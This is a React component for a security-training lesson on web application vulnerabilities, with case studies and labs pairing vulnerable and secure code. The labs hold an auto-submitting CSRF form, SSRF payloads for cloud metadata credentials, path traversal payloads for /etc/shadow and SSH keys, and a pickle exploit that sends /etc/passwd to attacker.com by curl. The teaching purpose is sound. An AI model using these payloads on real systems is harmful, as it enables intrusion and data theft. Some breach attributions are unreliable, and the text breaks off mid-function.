import { useState } from 'react';
import { ArrowLeft, Shield, AlertTriangle, Code, BookOpen, Wrench, ExternalLink } from 'lucide-react';
import { Link } from 'react-router-dom';

interface WebAppVulnerabilitiesConceptProps {
  onBack?: () => void;
}

export const WebAppVulnerabilitiesConcept = ({ onBack }: WebAppVulnerabilitiesConceptProps) => {
  const [activeTab, setActiveTab] = useState('theory');

  return (
    <div className="min-h-screen bg-gray-50 dark:bg-slate-950 transition-colors">
      {/* Header */}
      <div className="bg-gradient-to-r from-indigo-500 to-purple-600 text-white py-16">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          {onBack && (
            <button
              onClick={onBack}
              className="flex items-center text-white/90 hover:text-white mb-6 transition-colors"
            >
              <ArrowLeft className="w-5 h-5 mr-2" />
              Back to Dashboard
            </button>
          )}

          <div className="flex items-center space-x-4 mb-4">
            <div className="p-3 bg-white/10 rounded-lg backdrop-blur-sm">
              <Shield className="w-8 h-8" />
            </div>
            <div>
              <h1 className="text-4xl font-bold">Web Application Vulnerabilities</h1>
              <p className="text-indigo-100 mt-2">Critical Security Flaws in Modern Web Apps</p>
            </div>
          </div>

          <div className="flex flex-wrap gap-3 mt-6">
            <span className="px-4 py-2 bg-white/20 rounded-full text-sm backdrop-blur-sm">
              Intermediate
            </span>
            <span className="px-4 py-2 bg-white/20 rounded-full text-sm backdrop-blur-sm">
              150 Points
            </span>
            <span className="px-4 py-2 bg-white/20 rounded-full text-sm backdrop-blur-sm">
              Traditional Hacking
            </span>
          </div>
        </div>
      </div>

      {/* Tab Navigation */}
      <div className="bg-white dark:bg-slate-900 border-b border-gray-200 dark:border-slate-800 transition-colors">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex space-x-8">
            {[
              { id: 'theory', label: 'Theory', icon: BookOpen },
              { id: 'lab', label: 'Lab', icon: Code },
              { id: 'tools', label: 'Tools', icon: Wrench },
              { id: 'references', label: 'References', icon: ExternalLink }
            ].map(tab => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center space-x-2 py-4 border-b-2 transition-colors ${
                  activeTab === tab.id
                    ? 'border-indigo-500 text-indigo-600 dark:text-indigo-400'
                    : 'border-transparent text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-300'
                }`}
              >
                <tab.icon className="w-5 h-5" />
                <span className="font-medium">{tab.label}</span>
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* Tab Content */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        {activeTab === 'theory' && (
          <div className="space-y-8">
            {/* Overview */}
            <section>
              <h2 className="text-3xl font-bold text-gray-900 dark:text-white mb-4">
                Understanding Web Application Vulnerabilities
              </h2>
              <div className="prose dark:prose-invert max-w-none">
                <p className="text-lg text-gray-600 dark:text-gray-400">
                  Web application vulnerabilities are security flaws in websites and web services that attackers
                  can exploit to compromise systems, steal data, or disrupt operations. Beyond SQL Injection and
                  XSS, numerous critical vulnerabilities plague modern web applications, from authentication bypasses
                  to server-side request forgery. Understanding these vulnerabilities is essential for building
                  secure web applications.
                </p>
              </div>
            </section>

            {/* Key Vulnerability Types */}
            <section className="bg-white dark:bg-slate-900 border border-gray-200 dark:border-slate-800 rounded-lg p-8">
              <h3 className="text-2xl font-bold text-gray-900 dark:text-white mb-6 flex items-center">
                <AlertTriangle className="w-6 h-6 mr-3 text-indigo-500" />
                Critical Web Vulnerability Categories
              </h3>

              <div className="space-y-6">
                <div className="border-l-4 border-indigo-500 pl-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-2">
                    1. Cross-Site Request Forgery (CSRF)
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Forces authenticated users to execute unwanted actions by exploiting their active sessions.
                    Attacker tricks victim's browser into sending malicious requests to a trusted site.
                  </p>
                  <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4 text-sm">
                    <p className="text-gray-700 dark:text-gray-300">
                      <strong className="text-indigo-600 dark:text-indigo-400">Attack Vector:</strong> Hidden form in malicious website submits
                      bank transfer request using victim's active banking session.
                    </p>
                    <p className="text-gray-700 dark:text-gray-300 mt-2">
                      <strong className="text-indigo-600 dark:text-indigo-400">OWASP Rank:</strong> A01:2021 - Broken Access Control
                    </p>
                  </div>
                </div>

                <div className="border-l-4 border-purple-500 pl-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-2">
                    2. Server-Side Request Forgery (SSRF)
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Abuses server functionality to access internal resources, cloud metadata services, or perform
                    port scanning. Especially dangerous in cloud environments with metadata APIs.
                  </p>
                  <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4 text-sm">
                    <p className="text-gray-700 dark:text-gray-300">
                      <strong className="text-purple-600 dark:text-purple-400">Attack Vector:</strong> Manipulate URL parameter
                      to access AWS metadata endpoint (http://169.254.169.254/latest/meta-data/) and steal IAM credentials.
                    </p>
                    <p className="text-gray-700 dark:text-gray-300 mt-2">
                      <strong className="text-purple-600 dark:text-purple-400">CWE:</strong> CWE-918: Server-Side Request Forgery
                    </p>
                  </div>
                </div>

                <div className="border-l-4 border-pink-500 pl-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-2">
                    3. Insecure Deserialization
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Exploits unsafe deserialization of untrusted data to achieve remote code execution, replay attacks,
                    or privilege escalation. Common in Java, Python pickle, PHP, and Ruby applications.
                  </p>
                  <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4 text-sm">
                    <p className="text-gray-700 dark:text-gray-300">
                      <strong className="text-pink-600 dark:text-pink-400">Attack Vector:</strong> Craft malicious serialized object
                      containing OS commands that execute when application deserializes the cookie or session token.
                    </p>
                    <p className="text-gray-700 dark:text-gray-300 mt-2">
                      <strong className="text-pink-600 dark:text-pink-400">OWASP Rank:</strong> A08:2021 - Software and Data Integrity Failures
                    </p>
                  </div>
                </div>

                <div className="border-l-4 border-amber-500 pl-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-2">
                    4. XML External Entity (XXE) Injection
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Exploits vulnerable XML parsers by referencing external entities to disclose internal files,
                    perform SSRF attacks, or cause denial of service through billion laughs attacks.
                  </p>
                  <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4 text-sm">
                    <p className="text-gray-700 dark:text-gray-300">
                      <strong className="text-amber-600 dark:text-amber-400">Attack Vector:</strong> Inject XXE payload in XML document
                      to read /etc/passwd or access AWS metadata service via file:// or http:// protocols.
                    </p>
                    <p className="text-gray-700 dark:text-gray-300 mt-2">
                      <strong className="text-amber-600 dark:text-amber-400">CWE:</strong> CWE-611: Improper Restriction of XML External Entity Reference
                    </p>
                  </div>
                </div>

                <div className="border-l-4 border-red-500 pl-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-2">
                    5. Path Traversal (Directory Traversal)
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Manipulates file path parameters using ../ sequences to access files outside intended directory,
                    potentially reading sensitive configuration files, source code, or credentials.
                  </p>
                  <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4 text-sm">
                    <p className="text-gray-700 dark:text-gray-300">
                      <strong className="text-red-600 dark:text-red-400">Attack Vector:</strong> Modify file parameter
                      from ?file=document.pdf to ?file=../../../../etc/passwd to read system files.
                    </p>
                    <p className="text-gray-700 dark:text-gray-300 mt-2">
                      <strong className="text-red-600 dark:text-red-400">CWE:</strong> CWE-22: Improper Limitation of a Pathname to a Restricted Directory
                    </p>
                  </div>
                </div>

                <div className="border-l-4 border-orange-500 pl-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-2">
                    6. File Upload Vulnerabilities
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Allows attackers to upload malicious files (web shells, executables, malware) that can lead
                    to remote code execution, defacement, or full system compromise if executed by server.
                  </p>
                  <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4 text-sm">
                    <p className="text-gray-700 dark:text-gray-300">
                      <strong className="text-orange-600 dark:text-orange-400">Attack Vector:</strong> Upload PHP web shell
                      disguised as image.jpg.php, bypass client-side validation, then execute via direct URL access.
                    </p>
                    <p className="text-gray-700 dark:text-gray-300 mt-2">
                      <strong className="text-orange-600 dark:text-orange-400">CWE:</strong> CWE-434: Unrestricted Upload of File with Dangerous Type
                    </p>
                  </div>
                </div>

                <div className="border-l-4 border-blue-500 pl-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-2">
                    7. Broken Authentication & Session Management
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Flaws in authentication implementation including weak passwords, predictable session tokens,
                    improper logout, session fixation, and credential stuffing vulnerabilities.
                  </p>
                  <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4 text-sm">
                    <p className="text-gray-700 dark:text-gray-300">
                      <strong className="text-blue-600 dark:text-blue-400">Attack Vector:</strong> Session IDs in URL
                      parameters (vulnerable to referer leakage), weak session timeouts, or session fixation attacks.
                    </p>
                    <p className="text-gray-700 dark:text-gray-300 mt-2">
                      <strong className="text-blue-600 dark:text-blue-400">OWASP Rank:</strong> A07:2021 - Identification and Authentication Failures
                    </p>
                  </div>
                </div>

                <div className="border-l-4 border-green-500 pl-6">
                  <h4 className="text-xl font-semibold text-gray-900 dark:text-white mb-2">
                    8. Security Misconfiguration
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-3">
                    Default configurations, unnecessary features enabled, verbose error messages exposing stack traces,
                    missing security headers, or outdated software versions create attack surface.
                  </p>
                  <div className="bg-gray-50 dark:bg-slate-950/50 rounded p-4 text-sm">
                    <p className="text-gray-700 dark:text-gray-300">
                      <strong className="text-green-600 dark:text-green-400">Attack Vector:</strong> Admin console accessible
                      with default credentials (admin/admin), directory listing enabled, debug mode in production.
                    </p>
                    <p className="text-gray-700 dark:text-gray-300 mt-2">
                      <strong className="text-green-600 dark:text-green-400">OWASP Rank:</strong> A05:2021 - Security Misconfiguration
                    </p>
                  </div>
                </div>
              </div>
            </section>

            {/* Real-World Examples */}
            <section className="bg-white dark:bg-slate-900 border border-gray-200 dark:border-slate-800 rounded-lg p-8">
              <h3 className="text-2xl font-bold text-gray-900 dark:text-white mb-6">
                High-Profile Web Vulnerability Breaches
              </h3>

              <div className="space-y-6">
                <div className="bg-gray-50 dark:bg-slate-950/50 rounded-lg p-6">
                  <h4 className="text-xl font-semibold text-indigo-600 dark:text-indigo-400 mb-2">
                    Capital One Data Breach (2019) - SSRF
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-2">
                    <strong className="text-gray-900 dark:text-white">Attack Vector:</strong> SSRF vulnerability in web application firewall configuration
                  </p>
                  <p className="text-gray-600 dark:text-gray-400 mb-2">
                    <strong className="text-gray-900 dark:text-white">Impact:</strong> 106 million customer records exposed including Social Security numbers
                  </p>
                  <p className="text-gray-600 dark:text-gray-400 mb-2">
                    <strong className="text-gray-900 dark:text-white">Financial Cost:</strong> $190 million settlement, $80 million fine
                  </p>
                  <p className="text-gray-600 dark:text-gray-400">
                    <strong className="text-gray-900 dark:text-white">Outcome:</strong> Attacker exploited misconfigured WAF to access AWS metadata
                    service (169.254.169.254), stole IAM credentials, then accessed S3 buckets containing customer data.
                    Led to significant regulatory scrutiny of cloud security practices.
                  </p>
                </div>

                <div className="bg-gray-50 dark:bg-slate-950/50 rounded-lg p-6">
                  <h4 className="text-xl font-semibold text-purple-600 dark:text-purple-400 mb-2">
                    Apache Struts Equifax Breach (2017) - Insecure Deserialization
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-2">
                    <strong className="text-gray-900 dark:text-white">Attack Vector:</strong> CVE-2017-5638 - Remote code execution via Content-Type header
                  </p>
                  <p className="text-gray-600 dark:text-gray-400 mb-2">
                    <strong className="text-gray-900 dark:text-white">Impact:</strong> 147.9 million consumers affected, largest data breach in history
                  </p>
                  <p className="text-gray-600 dark:text-gray-400 mb-2">
                    <strong className="text-gray-900 dark:text-white">Financial Cost:</strong> $1.4 billion total costs, $700 million settlement
                  </p>
                  <p className="text-gray-600 dark:text-gray-400">
                    <strong className="text-gray-900 dark:text-white">Outcome:</strong> Attackers exploited unpatched Struts vulnerability for 76 days,
                    exfiltrating Social Security numbers, birth dates, addresses, and 209,000 credit card numbers.
                    CEO and CIO resigned, multiple congressional hearings held.
                  </p>
                </div>

                <div className="bg-gray-50 dark:bg-slate-950/50 rounded-lg p-6">
                  <h4 className="text-xl font-semibold text-red-600 dark:text-red-400 mb-2">
                    British Airways Breach (2018) - Magecart Web Skimming
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-2">
                    <strong className="text-gray-900 dark:text-white">Attack Vector:</strong> Compromised third-party JavaScript library (supply chain attack)
                  </p>
                  <p className="text-gray-600 dark:text-gray-400 mb-2">
                    <strong className="text-gray-900 dark:text-white">Impact:</strong> 380,000 payment card details and 500,000 customer records stolen
                  </p>
                  <p className="text-gray-600 dark:text-gray-400 mb-2">
                    <strong className="text-gray-900 dark:text-white">Financial Cost:</strong> £20 million GDPR fine ($26 million), reputational damage
                  </p>
                  <p className="text-gray-600 dark:text-gray-400">
                    <strong className="text-gray-900 dark:text-white">Outcome:</strong> Attackers injected 22 lines of malicious JavaScript into BA's
                    payment page, harvesting credit card details in real-time. Active for 15 days before detection.
                    Highlighted dangers of third-party script dependencies and lack of Content Security Policy.
                  </p>
                </div>

                <div className="bg-gray-50 dark:bg-slate-950/50 rounded-lg p-6">
                  <h4 className="text-xl font-semibold text-amber-600 dark:text-amber-400 mb-2">
                    U.S. Office of Personnel Management (2015) - Multi-Vector Attack
                  </h4>
                  <p className="text-gray-600 dark:text-gray-400 mb-2">
                    <strong className="text-gray-900 dark:text-white">Attack Vector:</strong> Combination of social engineering, SQLi, and backdoors
                  </p>
                  <p className="text-gray-600 dark:text-gray-400 mb-2">
                    <strong className="text-gray-900 dark:text-white">Impact:</strong> 21.5 million government personnel records, including 5.6 million fingerprints
                  </p>
                  <p className="text-gray-600 dark:text-gray-400 mb-2">
                    <strong className="text-gray-900 dark:text-white">Financial Cost:</strong> Over $300 million for remediation and identity protection services
                  </p>
                  <p className="text-gray-600 dark:text-gray-400">
                    <strong className="text-gray-900 dark:text-white">Outcome:</strong> Nation-state actors exploited multiple web vulnerabilities including
                    unpatched systems, weak authentication, and database injections. Stole SF-86 security clearance
                    forms containing intimate personal details. OPM Director resigned, massive security overhaul initiated.
                  </p>
                </div>
              </div>
            </section>

            {/* Key Takeaways */}
            <section className="bg-gradient-to-r from-indigo-500 to-purple-600 rounded-lg p-8 text-white">
              <h3 className="text-2xl font-bold mb-6">Key Takeaways</h3>
              <ul className="space-y-3">
                <li className="flex items-start">
                  <Shield className="w-6 h-6 mr-3 flex-shrink-0 mt-1" />
                  <span>Web vulnerabilities remain the #1 attack vector, responsible for 90% of data breaches</span>
                </li>
                <li className="flex items-start">
                  <Shield className="w-6 h-6 mr-3 flex-shrink-0 mt-1" />
                  <span>CSRF, SSRF, and deserialization attacks are often overlooked but highly critical</span>
                </li>
                <li className="flex items-start">
                  <Shield className="w-6 h-6 mr-3 flex-shrink-0 mt-1" />
                  <span>Cloud environments introduce new attack surfaces (metadata APIs, IAM misconfigurations)</span>
                </li>
                <li className="flex items-start">
                  <Shield className="w-6 h-6 mr-3 flex-shrink-0 mt-1" />
                  <span>Third-party dependencies and supply chain attacks are growing threats</span>
                </li>
                <li className="flex items-start">
                  <Shield className="w-6 h-6 mr-3 flex-shrink-0 mt-1" />
                  <span>Defense-in-depth: Combine input validation, output encoding, authentication, and monitoring</span>
                </li>
                <li className="flex items-start">
                  <Shield className="w-6 h-6 mr-3 flex-shrink-0 mt-1" />
                  <span>Security headers (CSP, HSTS, X-Frame-Options) provide critical browser-level protection</span>
                </li>
                <li className="flex items-start">
                  <Shield className="w-6 h-6 mr-3 flex-shrink-0 mt-1" />
                  <span>Regular security audits, penetration testing, and patch management are non-negotiable</span>
                </li>
                <li className="flex items-start">
                  <Shield className="w-6 h-6 mr-3 flex-shrink-0 mt-1" />
                  <span>OWASP Top 10 provides comprehensive guidance on most critical web security risks</span>
                </li>
                <li className="flex items-start">
                  <Shield className="w-6 h-6 mr-3 flex-shrink-0 mt-1" />
                  <span>Web Application Firewalls (WAF) add layer of defense but cannot replace secure coding</span>
                </li>
                <li className="flex items-start">
                  <Shield className="w-6 h-6 mr-3 flex-shrink-0 mt-1" />
                  <span>Zero-trust architecture: Never trust, always verify - even internal requests</span>
                </li>
              </ul>
            </section>
          </div>
        )}

        {activeTab === 'lab' && (
          <div className="space-y-8">
            <section>
              <h2 className="text-3xl font-bold text-gray-900 dark:text-white mb-4">
                Hands-On Lab: Web Vulnerability Exploitation & Defense
              </h2>
              <p className="text-lg text-gray-600 dark:text-gray-400 mb-6">
                Practice identifying and exploiting common web vulnerabilities, then implement proper defenses.
                All examples include both vulnerable and secure implementations.
              </p>
            </section>

            {/* Lab 1: CSRF */}
            <section className="bg-white dark:bg-slate-900 border border-gray-200 dark:border-slate-800 rounded-lg p-8">
              <h3 className="text-2xl font-bold text-gray-900 dark:text-white mb-4">
                Lab 1: Cross-Site Request Forgery (CSRF) Attack & Defense
              </h3>

              <div className="space-y-6">
                <div>
                  <h4 className="text-lg font-semibold text-red-600 dark:text-red-400 mb-3">
                    Vulnerable Code (Express.js)
                  </h4>
                  <div className="bg-red-500/10 border border-red-500/50 rounded-lg p-4">
                    <p className="text-sm font-semibold text-red-400 mb-2">
                      WARNING: VULNERABLE CODE - Educational Only
                    </p>
                    <pre className="bg-gray-900 text-gray-100 p-4 rounded overflow-x-auto text-sm">
{`// Vulnerable banking application
app.post('/transfer', (req, res) => {
  const { to, amount } = req.body;
  const from = req.session.userId;

  // NO CSRF PROTECTION!
  // Anyone can trick user into submitting this form

  database.transfer(from, to, amount);
  res.send('Transfer successful');
});`}
                    </pre>
                  </div>
                </div>

                <div>
                  <h4 className="text-lg font-semibold text-red-600 dark:text-red-400 mb-3">
                    Attack Code (Malicious Website)
                  </h4>
                  <div className="bg-gray-50 dark:bg-slate-950/50 rounded-lg p-4">
                    <pre className="bg-gray-900 text-gray-100 p-4 rounded overflow-x-auto text-sm">
{`<!-- Attacker's malicious website -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
  </form>
  <h1>Loading cute cat pictures...</h1>
</body>
</html>

<!-- User visits attacker site while logged into bank
     Form auto-submits using victim's active session
     Money transfers to attacker -->`}
                    </pre>
                  </div>
                </div>

                <div>
                  <h4 className="text-lg font-semibold text-green-600 dark:text-green-400 mb-3">
                    Secure Code (CSRF Token Protection)
                  </h4>
                  <div className="bg-green-500/10 border border-green-500/50 rounded-lg p-4">
                    <p className="text-sm font-semibold text-green-400 mb-2">
                      SECURE CODE - Production Ready
                    </p>
                    <pre className="bg-gray-900 text-gray-100 p-4 rounded overflow-x-auto text-sm">
{`const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Generate CSRF token for form
app.get('/transfer-page', csrfProtection, (req, res) => {
  res.render('transfer', { csrfToken: req.csrfToken() });
});

// Validate CSRF token on submission
app.post('/transfer', csrfProtection, (req, res) => {
  const { to, amount } = req.body;
  const from = req.session.userId;

  // CSRF middleware automatically validates token
  // Invalid/missing token = 403 Forbidden

  // Additional checks
  if (!isValidAccount(to)) {
    return res.status(400).send('Invalid account');
  }

  if (amount > getAccountBalance(from)) {
    return res.status(400).send('Insufficient funds');
  }

  database.transfer(from, to, amount);
  res.send('Transfer successful');
});

// HTML form with CSRF token
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="{{csrfToken}}">
  <input name="to" placeholder="Recipient">
  <input name="amount" placeholder="Amount">
  <button type="submit">Transfer</button>
</form>`}
                    </pre>
                  </div>
                </div>
              </div>
            </section>

            {/* Lab 2: SSRF */}
            <section className="bg-white dark:bg-slate-900 border border-gray-200 dark:border-slate-800 rounded-lg p-8">
              <h3 className="text-2xl font-bold text-gray-900 dark:text-white mb-4">
                Lab 2: Server-Side Request Forgery (SSRF)
              </h3>

              <div className="space-y-6">
                <div>
                  <h4 className="text-lg font-semibold text-red-600 dark:text-red-400 mb-3">
                    Vulnerable Code (Python Flask)
                  </h4>
                  <div className="bg-red-500/10 border border-red-500/50 rounded-lg p-4">
                    <p className="text-sm font-semibold text-red-400 mb-2">
                      WARNING: VULNERABLE CODE - Educational Only
                    </p>
                    <pre className="bg-gray-900 text-gray-100 p-4 rounded overflow-x-auto text-sm">
{`import requests
from flask import Flask, request

app = Flask(__name__)

@app.route('/fetch-url')
def fetch_url():
    # NO URL VALIDATION!
    # Attacker can access internal resources
    url = request.args.get('url')

    response = requests.get(url)
    return response.text

# Attack payload:
# /fetch-url?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns AWS IAM credentials!

# /fetch-url?url=http://localhost:8080/admin
# Access internal admin panel

# /fetch-url?url=file:///etc/passwd
# Read local files`}
                    </pre>
                  </div>
                </div>

                <div>
                  <h4 className="text-lg font-semibold text-green-600 dark:text-green-400 mb-3">
                    Secure Code (URL Whitelist + Validation)
                  </h4>
                  <div className="bg-green-500/10 border border-green-500/50 rounded-lg p-4">
                    <p className="text-sm font-semibold text-green-400 mb-2">
                      SECURE CODE - Production Ready
                    </p>
                    <pre className="bg-gray-900 text-gray-100 p-4 rounded overflow-x-auto text-sm">
{`import requests
from flask import Flask, request, abort
from urllib.parse import urlparse
import ipaddress

app = Flask(__name__)

# Whitelist of allowed domains
ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']

# Blacklist dangerous IPs
BLOCKED_IPS = [
    '127.0.0.0/8',      # Localhost
    '10.0.0.0/8',       # Private network
    '172.16.0.0/12',    # Private network
    '192.168.0.0/16',   # Private network
    '169.254.0.0/16',   # AWS metadata
    '::1/128',          # IPv6 localhost
    'fc00::/7'          # IPv6 private
]

def is_safe_url(url):
    """Validate URL against whitelist and blacklist."""
    try:
        parsed = urlparse(url)

        # Only allow HTTP/HTTPS
        if parsed.scheme not in ['http', 'https']:
            return False

        # Check domain whitelist
        if parsed.hostname not in ALLOWED_DOMAINS:
            return False

        # Resolve hostname to IP
        import socket
        ip = socket.gethostbyname(parsed.hostname)

        # Check if IP is in blocked ranges
        ip_obj = ipaddress.ip_address(ip)
        for blocked_range in BLOCKED_IPS:
            if ip_obj in ipaddress.ip_network(blocked_range):
                return False

        return True
    except Exception:
        return False

@app.route('/fetch-url')
def fetch_url():
    url = request.args.get('url')

    if not url:
        abort(400, 'URL parameter required')

    # Validate URL
    if not is_safe_url(url):
        abort(403, 'URL not allowed')

    try:
        # Additional safety: timeout, max size
        response = requests.get(
            url,
            timeout=5,
            allow_redirects=False,  # Prevent redirect bypass
            stream=True
        )

        # Limit response size
        content = response.raw.read(1024 * 1024)  # 1MB max

        return content
    except requests.RequestException as e:
        abort(500, f'Request failed: {str(e)}')`}
                    </pre>
                  </div>
                </div>
              </div>
            </section>

            {/* Lab 3: Path Traversal */}
            <section className="bg-white dark:bg-slate-900 border border-gray-200 dark:border-slate-800 rounded-lg p-8">
              <h3 className="text-2xl font-bold text-gray-900 dark:text-white mb-4">
                Lab 3: Path Traversal (Directory Traversal)
              </h3>

              <div className="space-y-6">
                <div>
                  <h4 className="text-lg font-semibold text-red-600 dark:text-red-400 mb-3">
                    Vulnerable Code (PHP)
                  </h4>
                  <div className="bg-red-500/10 border border-red-500/50 rounded-lg p-4">
                    <p className="text-sm font-semibold text-red-400 mb-2">
                      WARNING: VULNERABLE CODE - Educational Only
                    </p>
                    <pre className="bg-gray-900 text-gray-100 p-4 rounded overflow-x-auto text-sm">
{`<?php
// Vulnerable file download endpoint
$filename = $_GET['file'];

// NO PATH VALIDATION!
$filepath = '/var/www/documents/' . $filename;

if (file_exists($filepath)) {
    header('Content-Type: application/octet-stream');
    readfile($filepath);
} else {
    echo "File not found";
}

// Attack payloads:
// ?file=../../../../etc/passwd
// ?file=../../../../etc/shadow
// ?file=../../../../var/www/html/.env
// ?file=../../../../home/user/.ssh/id_rsa
?>`}
                    </pre>
                  </div>
                </div>

                <div>
                  <h4 className="text-lg font-semibold text-green-600 dark:text-green-400 mb-3">
                    Secure Code (Path Normalization + Whitelist)
                  </h4>
                  <div className="bg-green-500/10 border border-green-500/50 rounded-lg p-4">
                    <p className="text-sm font-semibold text-green-400 mb-2">
                      SECURE CODE - Production Ready
                    </p>
                    <pre className="bg-gray-900 text-gray-100 p-4 rounded overflow-x-auto text-sm">
{`<?php
// Secure file download endpoint
$filename = $_GET['file'];

// Define allowed directory (no trailing slash)
$base_dir = realpath('/var/www/documents');

// Sanitize filename: remove path separators
$safe_filename = basename($filename);

// Only allow alphanumeric, dash, underscore, and period
if (!preg_match('/^[a-zA-Z0-9._-]+$/', $safe_filename)) {
    http_response_code(400);
    die('Invalid filename');
}

// Construct full path and resolve it
$requested_path = realpath($base_dir . '/' . $safe_filename);

// Verify the resolved path is within allowed directory
if ($requested_path === false ||
    strpos($requested_path, $base_dir) !== 0) {
    http_response_code(403);
    die('Access denied');
}

// Additional check: only allow specific extensions
$allowed_extensions = ['pdf', 'txt', 'docx', 'jpg', 'png'];
$extension = strtolower(pathinfo($requested_path, PATHINFO_EXTENSION));

if (!in_array($extension, $allowed_extensions)) {
    http_response_code(403);
    die('File type not allowed');
}

if (file_exists($requested_path) && is_file($requested_path)) {
    // Set proper headers
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' .
           $safe_filename . '"');
    header('Content-Length: ' . filesize($requested_path));

    readfile($requested_path);
} else {
    http_response_code(404);
    echo "File not found";
}
?>`}
                    </pre>
                  </div>
                </div>
              </div>
            </section>

            {/* Lab 4: Insecure Deserialization */}
            <section className="bg-white dark:bg-slate-900 border border-gray-200 dark:border-slate-800 rounded-lg p-8">
              <h3 className="text-2xl font-bold text-gray-900 dark:text-white mb-4">
                Lab 4: Insecure Deserialization
              </h3>

              <div className="space-y-6">
                <div>
                  <h4 className="text-lg font-semibold text-red-600 dark:text-red-400 mb-3">
                    Vulnerable Code (Python Pickle)
                  </h4>
                  <div className="bg-red-500/10 border border-red-500/50 rounded-lg p-4">
                    <p className="text-sm font-semibold text-red-400 mb-2">
                      WARNING: VULNERABLE CODE - Educational Only
                    </p>
                    <pre className="bg-gray-900 text-gray-100 p-4 rounded overflow-x-auto text-sm">
{`import pickle
import base64
from flask import Flask, request, session

app = Flask(__name__)
app.secret_key = 'weak_key'

@app.route('/login', methods=['POST'])
def login():
    user = {'username': request.form['username'], 'role': 'user'}
    # DANGEROUS: Pickle serialization
    session['user'] = base64.b64encode(pickle.dumps(user))
    return 'Logged in'

@app.route('/dashboard')
def dashboard():
    # DANGEROUS: Unpickling untrusted data
    user_data = pickle.loads(base64.b64decode(session['user']))

    if user_data['role'] == 'admin':
        return 'Admin Dashboard'
    return 'User Dashboard'

# Attack code: Craft malicious pickle to execute commands
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/steal?data=$(cat /etc/passwd)',))

malicious_pickle = base64.b64encode(pickle.dumps(Exploit()))
# Set this as session cookie to achieve RCE`}
                    </pre>
                  </div>
                </div>

                <div>
                  <h4 className="text-lg font-semibold text-green-600 dark:text-green-400 mb-3">
                    Secure Code (JSON with Signature)
                  </h4>
                  <div className="bg-green-500/10 border border-green-500/50 rounded-lg p-4">
                    <p className="text-sm font-semibold text-green-400 mb-2">
                      SECURE CODE - Production Ready
                    </p>
                    <pre className="bg-gray-900 text-gray-100 p-4 rounded overflow-x-auto text-sm">
{`import json
import hmac
import hashlib
from flask import Flask, request, session

app = Flask(__name__)
app.secret_key = 'strong_random_key_stored_securely'

def sign_data(data):
    """Create HMAC signature for data integrity."""
    data_json = json.dumps(data)
    signature = hmac.new(
        app.secret_key.encode(),
        data_json.encode(),
        hashlib.sha256
    ).hexdigest()
    return {'data': data_json, 'signature': signature}

def verify_data(signed_data):
    """Verify data signature and return data if valid."""
    data_json = signed_data['data']
    provided_sig = signed_data['signature']

    expected_sig = hmac.new(
        app.secret_key.encode(),
        data_json.encode(),
        hashlib.sha256
    ).hexdigest()

    # Constant-time comparison to prevent timing attacks
    if not hmac.compare_digest(provided_sig, expected_sig):
        raise ValueError('Invalid signature')

    return json.loads(data_json)

@app.route('/login', methods=['POST'])
def login():
    user = {
        'username': request.form['username'],
        'role': 'user',
        'timestamp': time.time()
    }

    # Use JSON (not pickle) with signature
    session['user'] = sign_data(user)
    return 'Logged in'

@app.route('/dashboard')
def dashboard():
    try:
        # Verify signature before trusting data
        user_data = verify_data(session['user'])

        # Additional validation
        if time.time() - user_data.get('timestamp', 0) > 3600:
            return 'Session expired', 401

        if user_data['role'] == 'admin':
            return 'Admin Dashboard'
        return 'User Dashboard'
    except (ValueError, KeyError):
        return 'Invalid session', 403

# Alternative: Use itsdangerous library
from itsdangerous import URLSafeTimedSerializer

serializer = URLSafeTimedSerializer(app.secret_key)

@app.route('/login-v2', methods=['POST'])
def login_v2():
    user = {'username': request.form['username'], 'role': 'user'}
    session['user'] = serializer.dumps(user)
    return 'Logged in'

@app.route('/dashboard-v2')
def dashboard_v2():
    try:
        # Automatically validates signature and age
        user_data = serializer.loads(
            session['user'],
            max_age=3600  # 1 hour expiry
        )

        if user_data['role'] == 'admin':
            return 'Admin Dashboard'
        return 'User Dashboard'
    except Exception:
